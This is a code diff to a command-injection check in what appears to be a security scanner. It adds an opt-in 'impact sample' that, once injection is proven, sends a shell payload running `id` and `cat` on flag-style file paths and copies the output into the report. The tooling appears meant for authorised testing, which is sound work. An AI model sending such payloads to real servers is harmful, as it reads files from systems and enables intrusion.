@@ -33,7 +33,7 @@ export const commandInjection: Check = {
   title: "OS-command / template injection on a declared sink (computed proof)",
   readOnly: false, // sends payloads that run on the server: active gate
   async run(ctx: CheckContext): Promise<Finding[]> {
-    const o = (ctx.options["command-injection"] ?? {}) as { enabled?: boolean; endpoints?: CmdEndpoint[] };
+    const o = (ctx.options["command-injection"] ?? {}) as { enabled?: boolean; endpoints?: CmdEndpoint[]; impactSample?: boolean };
     if (o.enabled !== true || !ctx.stagingUrl || !(o.endpoints?.length)) return [];
     ctx.scope.assertActiveAllowed("command-injection (payloads that run on the server)");
     const base = ctx.stagingUrl.replace(/\/+$/, "");
@@ -59,6 +59,21 @@ export const commandInjection: Check = {
       }
       if (!proof) { ctx.log(`command-injection: ${ep.url} not injectable`); continue; }
       const os = /\$\(\(|echo|`|\|\||&&|;|\|/.test(proof.form);
+      // Optional, opt-in IMPACT EVIDENCE: once injection is PROVEN, show a bounded
+      // sample of what the shell can read through the same channel — standard
+      // pentest practice (demonstrate impact, not just the mechanism). Conventional
+      // paths only (like the backup wordlists elsewhere), output capped. On a real
+      // target this reads real files, so it is behind an explicit flag + active mode.
+      let impact = "";
+      if (o.impactSample && os) {
+        const sep = proof.form.trim().startsWith("|") ? "|" : proof.form.trim().startsWith("&&") ? "&&" : ";";
+        const probe = `${sep} echo __CRS__; id; cat /flag /flag.txt /tmp/flag ./flag ./flag.txt flag.txt 2>/dev/null; echo __CRE__`;
+        try {
+          const res = await safeFetch(url, ctx.scope, { method: ep.method ?? "POST", headers, body: tmpl.replace(/__INJECT__/g, probe.replace(/"/g, '\\"')), maxBytes: 128 * 1024 });
+          const m = /__CRS__([\s\S]*?)__CRE__/.exec(res.body);
+          if (m && m[1]!.trim()) impact = m[1]!.trim().slice(0, 400);
+        } catch { /* impact read failed: the proof still stands */ }
+      }
       findings.push({
         id: `command-injection:${ep.url}`,
         check: "command-injection",
@@ -66,12 +81,12 @@ export const commandInjection: Check = {
         severity: "critical",
         state: "proven",
         location: url,
-        description: `The sink at ${ep.url} evaluated an injected expression: ${proof.reason}. ${os ? "User input reaches a shell" : "User input reaches a template engine"}, allowing arbitrary code execution.`,
+        description: `The sink at ${ep.url} evaluated an injected expression: ${proof.reason}. ${os ? "User input reaches a shell" : "User input reaches a template engine"}, allowing arbitrary code execution.${impact ? ` Impact sample (read through the same channel): ${impact}` : ""}`,
         remediation: `Never pass user input to a shell or template engine; use a fixed command with argument arrays, or a sandboxed template with no expression evaluation.`,
         proof: {
           method: "live computed differential on staging: a nonce placed next to 7*7; the response carries nonce+49, impossible unless the server evaluated it",
           replay: `send ${ep.method ?? "POST"} ${url} with the payload '<nonce>${proof.form}' in the sink`,
-          evidence: proof.reason,
+          evidence: impact ? `${proof.reason}\nimpact sample: ${impact}` : proof.reason,
         },
         regressionHint: `After deploy, an injected 7*7 next to a nonce at ${ep.url} must not come back as nonce49.`,
       });
